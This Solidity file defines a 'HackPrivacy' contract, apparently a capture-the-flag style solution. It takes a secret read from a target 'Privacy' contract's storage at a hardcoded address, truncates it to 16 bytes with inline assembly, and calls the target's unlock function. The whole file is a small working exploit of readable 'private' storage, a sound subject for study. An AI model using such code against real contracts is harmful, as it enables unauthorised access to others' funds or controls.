// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10; // Latest solidity version

import './Privacy.sol';

contract HackPrivacy {

  Privacy public originalContract = Privacy(0xabeB484Aa5db9407828f83fF80F432c715DD3181); 
  bytes32 stor4;
  bytes16 unlocker;


  function hack(bytes32 pass, bool zero) public {
    stor4 = pass;
    if (zero) {
      unlocker = transformTo16(stor4);
    } else {
      unlocker = transformTo16two(stor4);
    }
    originalContract.unlock(unlocker);
  }

  function transformTo16(bytes32 source) internal pure returns(bytes16) {
    bytes16[2] memory y = [bytes16(0), 0];
    assembly {
      mstore(y, source)
      mstore(add(y, 16), source)
    }
    return y[0];
  }

    function transformTo16two(bytes32 source) internal pure returns(bytes16) {
    bytes16[2] memory y = [bytes16(0), 0];
    assembly {
      mstore(y, source)
      mstore(add(y, 16), source)
    }
    return y[1];
  }

}